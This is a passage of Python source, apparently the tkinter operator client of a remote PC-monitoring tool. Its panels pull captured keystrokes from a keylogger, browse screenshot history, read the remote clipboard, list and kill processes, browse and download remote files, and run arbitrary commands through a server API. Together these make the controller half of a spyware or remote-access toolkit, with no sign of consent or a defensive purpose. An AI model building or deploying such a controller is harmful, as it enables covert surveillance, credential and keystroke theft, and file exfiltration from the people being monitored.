                    self.keylogger_text.insert(tk.END, data.get('text', ''))
                elif isinstance(data, str):
                    self.keylogger_text.insert(tk.END, data)
                else:
                    # maybe a list of entries
                    if isinstance(data, list):
                        for item in data:
                            self.keylogger_text.insert(tk.END, item.get('text', '') if isinstance(item, dict) else str(item))
            else:
                messagebox.showerror("Error", f"Failed to get keystrokes: {resp.status_code}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to get keystrokes: {str(e)}")

    def export_keystrokes(self):
        """Export keystrokes to file"""
        filename = filedialog.asksaveasfilename(defaultextension=".txt",
                                                filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if filename:
            try:
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(self.keylogger_text.get(1.0, tk.END))
                messagebox.showinfo("Success", f"Keystrokes exported to {filename}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to export keystrokes: {str(e)}")

    def create_screenshots_tab(self):
        """Create screenshots tab content"""
        # Split frame
        left_frame = ttk.Frame(self.screenshots_frame)
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        right_frame = ttk.Frame(self.screenshots_frame)
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)

        # Screenshots list
        list_frame = ttk.LabelFrame(left_frame, text="Screenshots")
        list_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        self.screenshots_listbox = tk.Listbox(list_frame, height=20)
        self.screenshots_listbox.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.screenshots_listbox.bind('<<ListboxSelect>>', self.preview_screenshot)
        self.screenshots_listbox.bind('<Double-Button-1>', self.show_fullscreen)

        screenshots_scroll = ttk.Scrollbar(list_frame, command=self.screenshots_listbox.yview)
        screenshots_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        self.screenshots_listbox.config(yscrollcommand=screenshots_scroll.set)

        refresh_btn = ttk.Button(list_frame, text="Refresh Gallery", command=self.refresh_gallery)
        refresh_btn.pack(pady=5)

        # Preview
        preview_frame = ttk.LabelFrame(right_frame, text="Preview")
        preview_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        self.preview_label = ttk.Label(preview_frame, text="Select a screenshot")
        self.preview_label.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

    def refresh_gallery(self):
        """Refresh screenshots gallery"""
        try:
            resp = self.session.get(f"{self.server_url}/api/screenshot/history", headers=self.headers)
            if resp.status_code == 200:
                screenshots = resp.json()
                self.screenshots_listbox.delete(0, tk.END)
                self.screenshots = screenshots
                for screenshot in screenshots:
                    filename = screenshot.get('filename', '')
                    timestamp = screenshot.get('timestamp', '')
                    self.screenshots_listbox.insert(tk.END, f"{timestamp} - {filename}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to get screenshots: {str(e)}")

    def preview_screenshot(self, event):
        """Preview selected screenshot"""
        try:
            selection = self.screenshots_listbox.curselection()
            if selection:
                index = selection[0]
                filename = self.screenshots[index]['filename']
                resp = self.session.get(f"{self.server_url}/api/screenshot/{filename}", headers=self.headers)
                if resp.status_code == 200:
                    data = resp.json()
                    img_data = base64.b64decode(data['image'])
                    img = Image.open(io.BytesIO(img_data))
                    img.thumbnail((400, 300), Image.Resampling.LANCZOS)
                    photo = ImageTk.PhotoImage(img)
                    self.preview_label.config(image=photo, text="")
                    setattr(self.preview_label, 'image', photo)
        except Exception as e:
            messagebox.showerror("Error", f"Failed to preview: {str(e)}")

    def show_fullscreen(self, event):
        """Show fullscreen image"""
        try:
            selection = self.screenshots_listbox.curselection()
            if selection:
                index = selection[0]
                filename = self.screenshots[index]['filename']
                resp = self.session.get(f"{self.server_url}/api/screenshot/{filename}", headers=self.headers)
                if resp.status_code == 200:
                    data = resp.json()
                    img_data = base64.b64decode(data['image'])
                    img = Image.open(io.BytesIO(img_data))

                    top = tk.Toplevel(self)
                    top.title(filename)

                    screen_width = top.winfo_screenwidth()
                    screen_height = top.winfo_screenheight()
                    img_width, img_height = img.size

                    scale = min(screen_width / img_width, screen_height / img_height) * 0.9
                    new_width = int(img_width * scale)
                    new_height = int(img_height * scale)

                    img = img.resize((new_width, new_height), Image.Resampling.LANCZOS)
                    photo = ImageTk.PhotoImage(img)

                    label = ttk.Label(top, image=photo)
                    setattr(label, 'image', photo)
                    label.pack(fill=tk.BOTH, expand=True)
                    label.bind('<Button-1>', lambda e: top.destroy())
        except Exception as e:
            messagebox.showerror("Error", f"Failed to show fullscreen: {str(e)}")

    def create_search_tab(self):
        """Create search tab content"""
        controls_frame = ttk.Frame(self.search_frame)
        controls_frame.pack(fill=tk.X, padx=5, pady=5)

        ttk.Label(controls_frame, text="Search:").grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
        self.search_var = tk.StringVar()
        ttk.Entry(controls_frame, textvariable=self.search_var, width=30).grid(row=0, column=1, padx=5, pady=5)

        ttk.Label(controls_frame, text="Type:").grid(row=0, column=2, padx=5, pady=5, sticky=tk.W)
        self.event_type_var = tk.StringVar()
        type_combo = ttk.Combobox(controls_frame, textvariable=self.event_type_var, width=15)
        type_combo['values'] = ('', 'key_press', 'mouse_click', 'window_change', 'screenshot')
        type_combo.grid(row=0, column=3, padx=5, pady=5)

        search_btn = ttk.Button(controls_frame, text="Search", command=self.search_events)
        search_btn.grid(row=0, column=4, padx=5, pady=5)

        clear_btn = ttk.Button(controls_frame, text="Clear", command=self.clear_search)
        clear_btn.grid(row=0, column=5, padx=5, pady=5)

        results_frame = ttk.LabelFrame(self.search_frame, text="Results")
        results_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        self.results_text = tk.Text(results_frame, wrap=tk.WORD)
        self.results_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        scroll = ttk.Scrollbar(results_frame, command=self.results_text.yview)
        scroll.pack(side=tk.RIGHT, fill=tk.Y)
        self.results_text.config(yscrollcommand=scroll.set)

    def search_events(self):
        """Search events"""
        try:
            params = {'limit': 1000}
            if self.search_var.get():
                search_text = self.search_var.get()
                if search_text:
                    params['search'] = search_text
            if self.event_type_var.get():
                event_type = self.event_type_var.get()
                if event_type:
                    params['type'] = event_type

            resp = self.session.get(f"{self.server_url}/api/events", headers=self.headers, params=params)
            if resp.status_code == 200:
                events = resp.json()
                self.results_text.delete(1.0, tk.END)
                if not events:
                    self.results_text.insert(tk.END, "No results found.")
                    return

                for event in events:
                    timestamp = event.get('timestamp', '')
                    event_type = event.get('type', '')
                    details = event.get('details', {})
                    self.results_text.insert(tk.END, f"{timestamp} - {event_type}: {details}\n")
        except Exception as e:
            messagebox.showerror("Error", f"Search failed: {str(e)}")

    def clear_search(self):
        """Clear search"""
        self.search_var.set("")
        self.event_type_var.set("")
        self.results_text.delete(1.0, tk.END)

    def show_clipboard_dialog(self):
        """Show clipboard dialog"""
        dialog = tk.Toplevel(self)
        dialog.title("Clipboard Monitor")
        dialog.geometry("500x400")
        dialog.transient(self.winfo_toplevel())

        result_text = tk.Text(dialog, wrap=tk.WORD)
        result_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        def get_clipboard():
            try:
                resp = self.session.get(f"{self.server_url}/api/clipboard", headers=self.headers)
                if resp.status_code == 200:
                    data = resp.json()
                    result_text.delete(1.0, tk.END)
                    result_text.insert(tk.END, f"Content:\n{data.get('content', '')}")
                else:
                    messagebox.showerror("Error", f"Failed: {resp.status_code}")
            except Exception as e:
                messagebox.showerror("Error", str(e))

        ttk.Button(dialog, text="Get Clipboard", command=get_clipboard).pack(pady=5)

    def show_process_dialog(self):
        """Show process manager dialog"""
        dialog = tk.Toplevel(self)
        dialog.title("Process Manager")
        dialog.geometry("800x600")
        dialog.transient(self.winfo_toplevel())

        # Controls
        controls = ttk.Frame(dialog)
        controls.pack(fill=tk.X, padx=10, pady=5)

        ttk.Button(controls, text="Refresh", command=lambda: load_processes()).pack(side=tk.LEFT, padx=5)

        pid_var = tk.StringVar()
        ttk.Label(controls, text="PID:").pack(side=tk.LEFT, padx=5)
        ttk.Entry(controls, textvariable=pid_var, width=10).pack(side=tk.LEFT, padx=5)

        def kill_process():
            if not pid_var.get():
                messagebox.showerror("Error", "Enter PID")
                return
            try:
                pid_str = pid_var.get().strip()
                if not pid_str.isdigit():
                    messagebox.showerror("Error", "PID must be a number")
                    return

                data = {"operation": "kill", "pid": int(pid_str)}
                resp = self.session.post(f"{self.server_url}/api/process", headers=self.headers, json=data)
                if resp.status_code == 200:
                    messagebox.showinfo("Success", "Process killed")
                    load_processes()
                else:
                    messagebox.showerror("Error", f"Failed: {resp.status_code}")
            except Exception as e:
                messagebox.showerror("Error", str(e))

        def load_processes():
            try:
                resp = self.session.get(f"{self.server_url}/api/process", headers=self.headers)
                if resp.status_code == 200:
                    procs = resp.json()
                    # Create/clear treeview
                    for child in dialog.winfo_children():
                        pass
                    # Simple textual display:
                    text = tk.Text(dialog)
                    text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
                    text.delete(1.0, tk.END)
                    for p in procs:
                        text.insert(tk.END, f"PID: {p.get('pid')} - {p.get('name')} - {p.get('user')}\n")
                else:
                    messagebox.showerror("Error", f"Failed to load processes: {resp.status_code}")
            except Exception as e:
                messagebox.showerror("Error", str(e))

        # Initially load
        load_processes()

    def show_filesystem_dialog(self):
        """Show filesystem browser dialog"""
        dialog = tk.Toplevel(self)
        dialog.title("Filesystem Browser")
        dialog.geometry("900x600")
        dialog.transient(self.winfo_toplevel())

        path_var = tk.StringVar(value="/")
        path_entry = ttk.Entry(dialog, textvariable=path_var, width=80)
        path_entry.pack(fill=tk.X, padx=10, pady=5)

        listbox = tk.Listbox(dialog)
        listbox.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        def list_path():
            try:
                resp = self.session.get(f"{self.server_url}/api/files", headers=self.headers, params={'path': path_var.get()})
                if resp.status_code == 200:
                    items = resp.json()
                    listbox.delete(0, tk.END)
                    for it in items:
                        listbox.insert(tk.END, it)
                else:
                    messagebox.showerror("Error", f"Failed: {resp.status_code}")
            except Exception as e:
                messagebox.showerror("Error", str(e))

        def download_selected():
            sel = listbox.curselection()
            if not sel:
                return
            name = listbox.get(sel[0])
            try:
                resp = self.session.get(f"{self.server_url}/api/files/download", headers=self.headers, params={'path': os.path.join(path_var.get(), name)})
                if resp.status_code == 200:
                    data = resp.json()
                    b = base64.b64decode(data.get('content', ''))
                    save = filedialog.asksaveasfilename(initialfile=name)
                    if save:
                        with open(save, 'wb') as f:
                            f.write(b)
                        messagebox.showinfo("Saved", f"File saved to {save}")
                else:
                    messagebox.showerror("Error", f"Download failed: {resp.status_code}")
            except Exception as e:
                messagebox.showerror("Error", str(e))

        btn_frame = ttk.Frame(dialog)
        btn_frame.pack(fill=tk.X, padx=10, pady=5)
        ttk.Button(btn_frame, text="List", command=list_path).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Download", command=download_selected).pack(side=tk.LEFT, padx=5)

    def show_command_dialog(self):
        """Send a command to the server"""
        dialog = tk.Toplevel(self)
        dialog.title("Run Command")
        dialog.geometry("600x400")
        dialog.transient(self.winfo_toplevel())

        cmd_var = tk.StringVar()
        ttk.Entry(dialog, textvariable=cmd_var, width=80).pack(padx=10, pady=10)

        output_text = tk.Text(dialog)
        output_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        def run_cmd():
            cmd = cmd_var.get().strip()
            if not cmd:
                return
            try:
                resp = self.session.post(f"{self.server_url}/api/command", headers=self.headers, json={'command': cmd}, timeout=30)
                if resp.status_code == 200:
                    data = resp.json()
                    output_text.delete(1.0, tk.END)
                    output_text.insert(tk.END, data.get('output', str(data)))
                else:
                    messagebox.showerror("Error", f"Failed: {resp.status_code}")
            except Exception as e:
                messagebox.showerror("Error", str(e))

        ttk.Button(dialog, text="Run", command=run_cmd).pack(pady=5)

# ------------------------------------------------------------
# If run as script, start the GUI
# ------------------------------------------------------------
if __name__ == "__main__":
    try:
        app = PCMonitorClient()
        app.mainloop()
    except Exception as e:
        print(f"Fatal error starting client: {e}")
